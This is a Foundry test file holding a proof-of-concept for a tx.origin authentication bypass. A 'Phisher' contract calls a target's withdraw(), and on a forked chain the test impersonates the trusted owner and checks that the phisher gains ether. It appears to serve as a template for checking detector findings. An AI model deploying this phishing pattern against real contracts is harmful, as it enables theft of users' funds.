// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- tx.origin authentication bypass (phishing)
/// @notice Detector: tx-origin. The target authenticates with tx.origin
///         instead of msg.sender. A victim who is tricked into calling a
///         malicious contract still has tx.origin == victim, so the
///         malicious contract can act as the victim.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: set OWNER to the victim whose
///      authority the target trusts, and adapt withdraw() to the target's
///      privileged function.

interface IVictim {
    function withdraw() external;
}

contract Phisher {
    IVictim public immutable victim;

    constructor(address victim_) {
        victim = IVictim(victim_);
    }

    // Victim calls this; victim.withdraw() sees tx.origin == victim.
    function attack() external {
        victim.withdraw();
    }

    receive() external payable {}
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // TODO: the account the target trusts via tx.origin.
    address public constant OWNER = address(0);

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        require(OWNER != address(0), "set OWNER to the trusted victim account");

        Phisher phisher = new Phisher(target);
        uint256 phisherBefore = address(phisher).balance;
        uint256 targetBefore = target.balance;

        // Victim is tricked into calling the phisher. Two-arg prank sets
        // BOTH msg.sender and tx.origin for the call (one-arg prank only
        // sets msg.sender — tx.origin would stay forge's default sender).
        vm.prank(OWNER, OWNER);
        phisher.attack();

        uint256 gained = address(phisher).balance - phisherBefore;
        console.log("target balance before:", targetBefore);
        console.log("target balance after:", target.balance);
        console.log("phisher gained:", gained);
        assertGt(gained, 0, "exploit did not reproduce: tx.origin check did not accept the phisher");

    }
}
